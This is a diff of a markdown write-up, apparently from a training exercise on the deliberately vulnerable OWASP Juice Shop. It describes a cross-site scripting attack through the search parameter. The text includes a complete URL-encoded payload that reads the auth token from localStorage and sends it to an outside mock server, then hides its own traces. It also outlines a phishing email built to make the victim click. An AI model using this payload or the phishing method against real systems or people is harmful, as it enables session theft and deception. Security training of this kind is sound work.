@@ -37,11 +37,11 @@ The missing CSP Header looks really promising. Upon further investigation we fou
 1) Inserts a iframe
 2) Provided javascript in the src tag of the iframe using the syntax `<iframe src="javascript:console.log('i can run js')">`
 3) We wrote a script that:
-    a) Reads token from local storage.
-    b) Makes API call to a mock server we set up using postman ([more info here](https://learning.postman.com/docs/designing-and-developing-your-api/mocking-data/mock-with-api/)). The api call looks like this:
+    - Reads token from local storage.
+    - Makes API call to a mock server we set up using postman ([more info here](https://learning.postman.com/docs/designing-and-developing-your-api/mocking-data/mock-with-api/)). The api call looks like this:
 `https://3b233c9b-8705-4517-b3d8-72e8183c0eg1.mock.pstmn.io?token=asd`
-    c) After making the API call, removes the query parameter
-    d) Removes the iframe
+    - After making the API call, removes the query parameter
+    - Removes the iframe
 4) Minified the javascript code using an online tool https://www.minifier.org/
 5) Inserted the code in inframe as mentioned in step 2
 
@@ -49,8 +49,10 @@ This is how the final url looks like:
 ```
 https://juice-shop.herokuapp.com/#/search?q=%3Ciframe%20src=%22javascript:function%20replaceState()%7Bwindow.parent.history.replaceState(%7B%7D,document.title,window.parent.location.href.split('?')%5B0%5D)%7D%0Afunction%20remoteEl()%7Bwindow.parent.document.querySelector('iframe').remove()%7D%0Afetch('https://3b233c9b-8705-4517-b3d8-72e8183c0ef6.mock.pstmn.io/token='.concat(localStorage.getItem('token'))).then((r)=%3E%7BreplaceState();remoteEl()%7D).catch((e)=%3E%7BreplaceState();remoteEl()%7D)%22%3E
 ```
+
 ## Writing email template
 We want our email to sound legit and provide the user a valid reason to click the link. We asked them to schedule a meeting by clicking on a link but embeded that with the malicious URL we designed in the previous part.
 
 ## Viewing results
 As soon as a user clicks on the malicious email, an API reqeust is sent to our postman mock server. We can monitor that and see if we get any requests, which will provide us with the token.
+![](./assets/results.png)
